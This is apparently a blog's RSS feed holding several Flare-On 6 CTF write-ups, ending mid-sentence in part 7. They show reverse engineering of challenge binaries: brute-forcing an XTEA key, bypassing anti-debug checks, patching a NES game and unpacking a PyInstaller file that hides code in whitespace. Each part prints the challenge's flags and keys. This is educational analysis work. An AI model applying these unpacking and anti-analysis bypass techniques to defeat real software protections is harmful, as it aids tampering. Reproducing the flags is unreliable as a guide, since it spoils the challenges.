}</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/the_key_to_success_0000.gif" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 15: the_key_to_success_0000.gif</figcaption></figure><p>The GIF hints that the first key byte used for encrypting <em>best.gif</em> is 0x31. Now all we need is to bruteforce the other 3 bytes of the key. We know that a GIF file starts with the bytes &quot;GIF89&quot;. If we use the correct key the decrypted buffer must start with those bytes. Further, to speed up bruteforce we can try to decrypt just the first 8 bytes instead of the entire file.</p><pre><code>int main()
{
  for (uint8_t k1 = 0; k1 &lt; 0xff; k1++)
  {
    for (uint8_t k2 = 0; k2 &lt; 0xff; k2++)
    {
      for (uint8_t k3 = 0; k3 &lt; 0xff; k3++)
      {
        // First 8 bytes of best.gif.Mugatu
        uint32_t ct[] = {0x50B08E24, 0x6F68B2E8};

        uint8_t key[] = {0x31, k1, k2, k3};

        xtea_decipher(32, ct, key);
        if (ct[0] == 0x38464947) //GIF
        {
          printf(&quot;Key bytes 31 %x %x %x\n&quot;, k1, k2, k3);
          return 0;
        }
      }
    }
  }
  return -1;
}</code></pre><p>Running our bruteforcer we get the full key in seconds as shown in Figure 16.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-2.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>FIgure 16: Bruteforcing the key</figcaption></figure><h3 id="decrypting-best-gif">Decrypting best.gif</h3><p>Using the key we can XTEA decrypt <em>best.gif.Mugatu</em> to obtain the flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/best.gif" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 10)" loading="lazy"><figcaption>Figure 17: best.gif</figcaption></figure><p>Flag: <a><code>FL4rE-oN_5o_Ho7_R1gHt_NoW@flare-on.com</code></a></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 9)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : reloaderd]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part9/</link>
      <guid isPermaLink="false">5d8b459f38c2d600381c9fb0</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Thu, 17 Oct 2019 17:41:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/09/9.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/09/9.png" alt="Flare-On 6 CTF WriteUp (Part 9)"><p>This is the ninth part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="9-reloaderd">9 - reloaderd</h2><p>The challenge reads</p><blockquote>This is a simple challenge, enter the password, receive the key. I hear that it caused problems when trying to analyze it with ghidra. Remember that valid flare-on flags will always end with @flare-on.com</blockquote><p>From a cursory look, this does look look like a simple challenge. Running the provided PE file <em>reloaderd.exe</em> prompts for a key.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-139.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 1: We need a key</figcaption></figure><p>Loading the binary in x64dbg we notice two calls from the main function.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-141.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 2: Two calls in main</figcaption></figure><p>The <code>print_banner</code> just prints the &quot;ReLoaderd&quot; banner. The remainder of the program logic is in the <code>do_it</code> function. The decompiled code of <code>do_it</code> in IDA looks like the following.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-142.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 3: The key check logic</figcaption></figure><p>The program reads in a key of maximum 33 characters. Next we can see a series of checks on the key. The key length must be 11, <code>key[1]</code> xored with 0x31 must equal 94 and so on. This looks too simple to be the ninth challenge, but anyway let&apos;s calculate the key by reversing the constraints.</p><pre><code>key[0] &lt;= 82 &apos;R&apos;
key[1] = 94 ^ 0x31 = 111 &apos;o&apos;
key[2] = 84 &apos;T&apos;
key[3] ^ key[4] == 65
key[5] = even
key[6] = 101 &apos;e&apos;
key[7] = 82 &apos;R&apos;
key[8] &lt;= 105 &apos;i&apos;
key[9] = 110 &apos;n&apos;
key[10] = 71 &apos;G&apos;</code></pre><p>Most of the letters can be figured out statically with the exception of the third, fourth and fifth letter. With a little brute-force, the key comes out to <code>RoT3rHeRinG</code>. Using it as the key, the program does accept it but prints a flag which doesn&apos;t look right.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-143.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 4: A fake flag!</figcaption></figure><h3 id="getting-to-the-real-key-check-routine">Getting to the real key check routine</h3><p>What we analyzed till now was not the actual flag check code. Let&apos;s load the binary in Ghidra as the challenge description hints.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-144.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 5: Ghidra fails to load the binary</figcaption></figure><p>No luck either! Ghidra errors out with an exception which was expected. However if we look at the error closely we can find it crashed while trying to process relocations. May be the binary has something to do with relocations. If we use a PE analysis tool like <a href="https://cerbero.io/peinsider/">PE Insider</a> we can notice a strange characteristics of the binary. The preferred imagebase is at 0xFFFF0000.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-145.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 6: Preferred ImageBase</figcaption></figure><p>For regular 32-bit user mode processes any address above 2 GB (0x80000000) is invalid. Here the Image Base specified in the PE header is invalid. In such a case Windows loads the file at the fixed address of 0x10000. This can be used as an anti-debug technique and is well <a href="http://pferrie.tripod.com/misc/lowlevel3.htm">documented</a>.</p><p>Since the binary can never be loaded at its preferred image base it has to be relocated. If we check the relocation directory we can find several relocation entries.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-146.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 7: The relocation directory</figcaption></figure><p>It&apos;s possible through the clever use of relocations the binary is patching itself at run-time. The code we are analyzing statically may not be the code that&apos;s executed. Let&apos;s re-debug the binary right from the entrypoint of the executable.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-147.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 8: An indirect function call</figcaption></figure><p>A few lines before it is about to call main we notice an indirect function call through the <code>esi</code> register. Stepping in we discover a hidden function not seen previously.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-148.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 9: Hidden code!</figcaption></figure><p>The presence of <code>cpuid</code> and <code>rdtsc</code> instructions indicate anti-debug code as seen in Figure 10.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-149.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 10: Lots of anti-debug</figcaption></figure><p>To bypass the anti-debug we need to nullify a few jumps. In general, we need to nop all those jump instructions which jumps (indirectly or directly) to 11523 as shown in Figure 11 &amp; Figure 12.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-150.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 11: Jumps to be nopped out</figcaption></figure><h3 id="getting-the-flag">Getting the flag</h3><p>Down below after bypassing the anti-debug we come across a piece of code which looks to be the place of the key check routine.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-151.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 12: Real key check code</figcaption></figure><p>The code as shown in Figure 12 reads in an key of max size 14 chars via the <code>fgets</code> function.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-152.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 13: Checking the key</figcaption></figure><p>The input key is then xored &#xA0;with a buffer of length 0x35 in a cyclic fashion. If our key is correct the buffer must end with the string &quot;@flare-on.com&quot; as in Figure 14.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-153.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 14: The correct key would give the flag</figcaption></figure><p>Using the obtained information so far, we can write a script to calculate the correct key. We know the buffer after xor must end with &quot;@flare-on.com&quot;. Thus if we xor the encrypted buffer with the above string it should reveal the key.</p><pre><code>target = &apos;7A 17 08 34 17 31 3B 25 5B 18 2E 3A 15 56 0E 11 3E 0D 11 3B 24 21 31 06 3C 26 7C 3C 0D 24 16 3A 14 79 01 3A 18 5A 58 73 2E 09 00 16 00 49 22 01 40 08 0A 14 00&apos;.split(&apos; &apos;)

target = list(map(lambda x:int(x, 16), target))
correct_end = b&apos;@flare-on.com&apos;[::-1]
key = bytearray()

for b in range(len(correct_end)):
	key.append(target[-2-b] ^ correct_end[b])

key = key[::-1]
print(&apos;key is:&apos;, str(key))</code></pre><p>Running the script gives us the key <code>3HeadedMonkey</code> &#xA0;and thus the flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-154.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 9)" loading="lazy"><figcaption>Figure 15: The flag</figcaption></figure><p>Flag: <code>I_mUsT_h4vE_leFt_it_iN_mY_OthEr_p4nTs?!@flare-on.com</code></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 8)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : snake]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part8/</link>
      <guid isPermaLink="false">5d8b451338c2d600381c9f9a</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Wed, 16 Oct 2019 18:40:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/09/8.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/09/8.png" alt="Flare-On 6 CTF WriteUp (Part 8)"><p>This is the eighth part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="8-snake">8 - snake</h2><p>The challenge reads</p><blockquote>The Flare team is attempting to pivot to full-time twitch streaming video games instead of reverse engineering computer software all day. We wrote our own classic NES game to stream content that nobody else has seen and watch those subscribers flow in. It turned out to be too hard for us to beat so we gave up. See if you can beat it and capture the internet points that we failed to collect.</blockquote><p>Different from others, challenge 8 deals with reversing a <a href="https://en.wikipedia.org/wiki/Nintendo_Entertainment_System">NES</a> Rom named <em>snake.nes</em>. We will be using the <a href="https://github.com/SourMesen/Mesen">Mesen</a> emulator for running the Rom. Among other features, Mesen supports debugging the assembly code which is integral for our purpose. The processor on the NES runs <a href="https://en.wikibooks.org/wiki/6502_Assembly">6502 assembly.</a> Without further ado, let&apos;s give the game a try.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-128.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 1: The starting window</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-130.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 2: A typical snake game</figcaption></figure><p>It&apos;s a typical snake game. The game is comprised of multiple levels. We progress to the next level when the snake has grown sufficiently long. With each level it becomes progressively harder to play as the snake moves faster.</p><h3 id="finding-the-snake-length-in-memory">Finding the snake length in memory</h3><p>Now that we know how the game works it is worth wondering whether is it possible to finish a level without playing at all? Internally, the game must store the current length of the snake somewhere in memory. If we can modify that value we may be able to bypass playing a level.</p><p>Mesen offers cheating functionality like the venerable Cheat Engine. Start a new Game and pause it immediately. Now go to Tools -&gt; Cheats. Initially, the length of the snake is 0. In the Cheat Finder tab, we add a filter for Current Value is Equal to 0.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-131.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 3: Using Cheat Finder</figcaption></figure><p>We play the game and eat the food once. The snake&apos;s length is now 1. Now we add a filter for current value is equal to 1. We get three possible memory locations.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-132.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 4: Three possible locations</figcaption></figure><p>Continuing in the same way, we just get a single hit when the snake&apos;s length is 2.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-133.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 5: Snake length is stored at address 0x25</figcaption></figure><p>Thus 0x25 is the address of the memory where the length of the snake is stored. Now we need to locate the code that writes to this address. This can be done in Mesen by setting a Write Breakpoint. Open the Memory viewer in Debug view and navigate to address 0x25 where the snake length is stored.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-135.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 6: Using the memory viewer</figcaption></figure><p>Right click and set a breakpoint on write as shown in Figure 7.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-136.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 7: Setting a memory write breakpoint</figcaption></figure><p>We continue playing the game and just after the snake eats the food the breakpoint triggers.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-137.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 8: The breakpoint hits</figcaption></figure><p>The code at C830 tried to write to the address at 0x25 which triggered the breakpoint. After incrementing the length it goes on to check if it equals 0x33. If not it jumps to C85B. Thus our snake has to be 0x33 units long in order to progress to the next level. We can set the memory to 0x33 to cheat our way to the next level, but there is an even easier way.</p><p>Recall, that the game is comprised of multiple levels. The code from C837 to C840 increments the current level when our snake is of length 0x33. At C840 the current level number is compared with 4 which implies there are that many levels. If our current level number is not 4, we jump to C84C or else we continue normally to C844.</p><h3 id="winning-the-game">Winning the game</h3><p>If we set the Instruction Pointer to C844 &#xA0;we can bypass playing the game totally. This can be done in Mesen using &quot;Set Next Statement&quot; in the right click pop up menu. Jumping to the address and resuming execution we are pleasantly greeted with the flag.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-138.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 8)" loading="lazy"><figcaption>Figure 9: The flag!</figcaption></figure><p>Flag: <a><code>NARPAS-SWORD@FLARE-ON.COM</code></a></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 7)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : wopr]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part7/</link>
      <guid isPermaLink="false">5d8b445b38c2d600381c9f86</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Tue, 15 Oct 2019 18:38:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/09/7.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/09/7.png" alt="Flare-On 6 CTF WriteUp (Part 7)"><p>This is the seventh part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="7-wopr">7 - wopr</h2><p>The challenge reads</p><blockquote>We used our own computer hacking skills to &quot;find&quot; this AI on a military supercomputer. It does strongly resemble the classic 1983 movie WarGames. Perhaps life imitates art? If you can find the launch codes for us, we&apos;ll let you pass to the next challenge. We promise not to start a thermonuclear war.</blockquote><p>Running the provided binary <em>wopr.exe</em> asks for an input. Not knowing what to do we type in help and it shows a list of available commands. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-92.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 1: List of commands</figcaption></figure><p>Fiddling with the game commands, we can find that there are three games.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-93.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 2: List of games</figcaption></figure><p>Among them the first two are unavailable. The third game &quot;global thermonuclear war&quot; does start but it requests a launch code.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-96.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 3: Thermonuclear war</figcaption></figure><p>Now at this point we notice an interesting behavior. As we don&apos;t know the launch code, we press Ctrl+C to exit and immediately we notice the following as in Figure 4.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-95.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 4: wopr is written in python</figcaption></figure><p>The traceback message reveals that the game was developed in Python and then converted to an exe. There are several Python to exe packagers with <a href="https://www.pyinstaller.org/">PyInstaller</a> being the most common. If we look at the Windows Temp directory when the binary is running we can notice a <em>MEI</em> named directory with python related files as shown in Figure 5. This is exactly how PyInstaller works. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-98.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 5: The python to exe packager is PyInstaller</figcaption></figure><h3 id="extracting-the-contents">Extracting the contents</h3><p>To reverse engineer PyInstaller generated binaries we need to extract its contents. We can use <a href="https://sourceforge.net/projects/pyinstallerextractor/">PyInstaller Extractor</a>. Running the script in Python 3.7 in Ubuntu we get the following output.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-99.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 6: Running pyinstxtractor</figcaption></figure><p>The scripts points to two possible entrypoints - <em>pyiboot01_bootstrap</em> and <em>pyiboot02_cleanup</em>. Among them the former is a PyInstaller specific script and thus not of interest. The other file is named in such a way to pass off as PyInstaller related script but a strings scan reveals the truth.</p><pre><code>$ strings pyiboot02_cleanup | tail -n 20
pigeon
fire
__doc__
hashlibr
lzma
pkgutil
random
struct
time
ctypes
print
get_data
BOUNCEr
globalsr
getattr
setattrr#
decompress
encoder
	Exceptionr
&lt;module&gt;~</code></pre><p>These pyiboot files are basically <em>pyc</em> files. To proceed we need to decompile it back to it&apos;s Python source. For decompiling, we will be using <a href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a>. However, we cannot directly use uncompyle6 as the <em>pyc</em> files have their header missing. Without the header, uncompyle6 wouldn&apos;t recognize this as a valid <em>pyc</em> file.</p><h3 id="decompiling-the-pyc">Decompiling the pyc</h3><p>The format of pyc header varies across different versions of Python. For Python 3.7 the header comprises of 4 fields with a size of 4 bytes each for a total of 16 bytes. We can take any existing <em>pyc</em> file for Python 3.7, copy the first 16 bytes and insert it at the start of <em>pyiboot02_cleanup. </em>Running uncompyle6, we get back the Python <a href="https://gist.github.com/extremecoders-re/86856f90df1e1db28987feaeabf9a4fd">source code</a>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-101.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 7: The decompiled source</figcaption></figure><p>The file starts with a huge docstring which is actually taken from the poem <a href="https://poets.org/poem/raven">The Raven</a> by Edgar Allan Poe. The main code starts next as in Figure 8.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-102.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 8: The main code</figcaption></figure><p><code><a href="https://docs.python.org/3/library/pkgutil.html#pkgutil.get_data">pkgutil.get_data</a></code> obtains a resource from a package which in this case is the file named <em>key</em> which we can find within the extracted directory. It&apos;s 256 bytes in size. Next, it uses <code><a href="https://docs.python.org/3/library/functions.html#getattr">getattr</a></code> and <code><a href="https://docs.python.org/3/library/functions.html#setattr">setattr</a></code> to change the definitions of two builtin-in functions.</p><pre><code>$  python
Python 2.7.15+ (default, Jul  9 2019, 16:51:35) 
[GCC 7.4.0] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.

&gt;&gt;&gt; format(1702389091, &apos;x&apos;).decode(&apos;hex&apos;)
&apos;exec&apos;

&gt;&gt;&gt; format(482955849332, &apos;x&apos;).decode(&apos;hex&apos;)
&apos;print&apos;

&gt;&gt;&gt; format(29516388843672123817340395359, &apos;x&apos;).decode(&apos;hex&apos;)
&apos;__builtins__&apos;
</code></pre><p>As we can see, the constants are integer representations of the strings. It swaps the <code>exec</code> function with the <code>print</code> function. We need to keep this in mind as we analyze the remainder of the code.</p><p>Next we have two functions <code>eye</code> and <code>fire</code>. The <code>fire</code> function closely resembles with RC4 and it takes two parameters.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-104.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 9: The fire function is actually RC4 crypt&#xA0;</figcaption></figure><p>At the end we see the docstring is passed to the <code>eye</code> function the output of which is passed to <code>fire</code> followed by <code>lzma.decompress</code> as in Figure 10. The decompressed output is then passed to the <code>exec</code> function (<code>print</code> was swapped with <code>exec</code>). &#xA0;This happens in a loop. If an exception occurs it is simply ignored by the <code>try...except</code> statement.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-105.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 10: In a loop!</figcaption></figure><h3 id="dumping-the-exec-d-code">Dumping the exec&apos;d code</h3><p>We already know that <code>fire</code> is the RC4 crypt function and it takes two parameters - cipher text and key. The ciphertext comes from the output of <code>eye</code> whereas the key is constructed from <code>bytes([i]) + BOUNCE</code>. Let&apos;s have a look inside the <code>eye</code> function.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-106.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 11: Function eye</figcaption></figure><p>The argument passed to <code>eye</code> is the docstring which it parses to generate the ciphertext bit by bit. The tab (ASCII 9) and space character (ASCII 32) represents bit 0 and 1 respectively. Let&apos;s go back to the loop (Figure 10) and see if we can dump the data it&apos;s trying to <code>exec</code>. This looks easy at first sight. If we change the code as shown in Figure 12 we should be able to get the code its trying to <code>exec</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-109.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Fgure 12: Trying to dump the exec&apos;d code</figcaption></figure><p>However, inspite of our efforts <code>lzma.decompress</code> fails in each of the 256 iterations of the loop. This indicates the data we are trying to decompress is not valid. We know that this data was constructed by the <code>eye</code> function by parsing the docstring. It&apos;s possible that the docstring is not correct in the first place which is the root cause for lzma to fail. Let&apos;s use the <a href="https://docs.python.org/3/library/marshal.html">marshal</a> module to inspect the file and check out the docstring</p><pre><code>&gt;&gt;&gt; import marshal
&gt;&gt;&gt; f = open(&apos;pyiboot02_cleanup&apos;, &apos;rb&apos;)
&gt;&gt;&gt; co = marshal.load(f)

&gt;&gt;&gt; co.co_consts[0][:500]
&apos;\nOnce upon a midnight dreary, while I pondered, weak and weary,\t\t \t\t\t  \t\t    \t \t  \t\t\t      \t\t\t\t \t\t\t\t\t\t \t\t   \t  \t\t\t \t\t   \t\t\t\t \t\t\t \t\t\t\t\t \t \t  \t \t\t \t\t \t    \t\t\t   \t\t \t    \t \t  \t\t \t      \t \t\t   \t\t \t      \t \t\t\t\t \t\t\t  \t \t  \t\t   \t\t \t \t  \t\t \t\t \t\t   \t \t \t\t\t  \t \t \t\t   \t\t\t\t    \t \t    \t\t\t   \t \t\t  \t  \t    \t\t \t\t\t  \t\t\nOver many a quaint and curious volume of forgotten lore-\t\t \t\t\t \t  \t\t\t \t \t\t\t\t\t\t\t     \t\t    \t  \t\t\t  \t \t    \t \t  \t  \t  \t \t \t\t\t\t\t\t  \t  \t \t   \t \t \t\t   \t\t \t \t\t\t \t\t \t \t \t\t  \t \t  \t\t\t     \t \t  \t  \t\t     \t\t&apos;</code></pre><p>As we can see, there are many spaces and tabs in between the lines. These were missing in our decompiled code which was the reason for failure. All that is now needed to do is to read the docstring from the file as shown in Figure 13.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-111.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 13: Dumping the exec&apos;d code</figcaption></figure><h3 id="analyzing-the-flag-check-logic">Analyzing the flag check logic</h3><p>We get the exec&apos;d data which is a Python script. This file implements the main game logic as we can see in Figure 14.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-112.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 14: The exec&apos;d code implements the game logic</figcaption></figure><p>When we played the game last time, it required a launch code. At the end of the script we can see if we enter the correct launch code it would print the flag. Let us see how we can get the launch code. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-113.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 15: The correct launch code gives us the flag</figcaption></figure><p>The launch code is 16 characters in length which can be inferred from the code below where it left justifies the code to a string of length 16 using the NULL byte as the padding character.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-115.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 16: Checking the launch code</figcaption></figure><p>It then constructs another 16 character list by xoring various characters of the launch code. If this matches <code>h</code> we have the correct code. Let&apos;s see what is <code>h</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-116.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 17: The h list</figcaption></figure><p><code>h</code> is another list which is generated by xoring two lists together one of which is hardcoded while the other comes from the call to a function named <code>wrong</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-117.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 18: The wrong function</figcaption></figure><p>The <code>wrong</code> function uses <code><a href="https://docs.python.org/3/library/ctypes.html">ctypes</a></code> to read various values from its process memory. While its possible to analyze the code and obtain the values ourselves it would be much better if we could modify the code to print out those values sparing ourselves a lot of work.</p><h3 id="modifying-the-script-in-memory">Modifying the script in memory</h3><p>From Figure 10, we know that it uses <code>exec</code> (disguised as print) to execute the generated code after lzma. Internally the CPython interpreter implements the <code>exec</code> logic in the <code><a href="https://github.com/python/cpython/blob/3.7/Python/bltinmodule.c">builtin_exec_impl</a></code> function. The function has the following prototype</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-118.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 7)" loading="lazy"><figcaption>Figure 19: builtin_exec_impl</figcaption></figure><p>The second parameter <code>source</code> contains a pointer to the <code>PyObject</code> containing the code to <code>exec</code>. We need to set a breakpoint on this function so that we can patch the code before it&apos;s executed. However there is a problem. The symbol<code>builtin_exec_impl</code> is not exported by the Python DLL. We have to find another way to locate it. We can use the PDB file for Python 3.7.2 which can be found <a href="https://www.python.org/ftp/python/3.7.2/win32/core_pdb.msi">here</a>. Alternatively we can also use string references to locate the function. </p><p>A few lines below we can see it references the string &quot;globals and locals cannot be NULL&quot;. We can use this to locate the function.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img 